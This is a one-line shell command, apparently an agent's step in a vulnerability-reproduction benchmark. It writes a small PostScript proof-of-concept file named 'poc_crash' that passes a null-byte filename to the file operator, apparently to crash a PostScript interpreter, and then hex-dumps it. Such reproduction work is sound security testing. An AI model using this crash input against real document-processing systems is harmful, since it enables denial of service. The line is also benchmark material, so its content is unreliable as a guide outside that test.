ls -la /CybinGym_workdir/ 2>/dev/null; printf '%%!PS\n(\\000foo) (r) file bytesavailable ==\n' > /CybinGym_workdir/poc_crash && echo WROTE; xxd /CybinGym_workdir/poc_crash
